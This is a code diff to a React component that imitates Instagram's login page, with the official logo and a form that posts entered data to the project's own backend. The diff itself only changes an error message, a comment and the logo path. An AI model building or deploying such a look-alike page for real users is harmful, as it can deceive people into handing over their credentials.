@@ -1,4 +1,4 @@
-import { useRef } from 'react'
+ import { useRef } from 'react'
 import './style.css' 
 import api from './api'
 
@@ -23,19 +23,18 @@ function Instagram() {
       alert("Dados enviados com sucesso!")
     } catch (error) {
       console.error("Erro na requisição:", error)
-      alert("Erro ao conectar com o servidor.")
+      alert("Erro ao conectar com o servidor. Verifique se o backend está rodando.")
     }
   }
 
   return (
     <div className='container'>
-      {/* O onSubmit no form garante que o 'Enter' do teclado também envie os dados */}
       <form onSubmit={(e) => { e.preventDefault(); createUsers(); }}>
         
         <div className="logo-container">
-          {/* Logo oficial em formato de texto para melhor aparência */}
+          {/* O caminho "/" aponta direto para a pasta 'public' no Vite */}
           <img 
-            src="upload.wikimedia.org" 
+            src="/logo.png" 
             alt="Instagram" 
             style={{ width: '175px', margin: '20px 0 30px 0' }}
           />
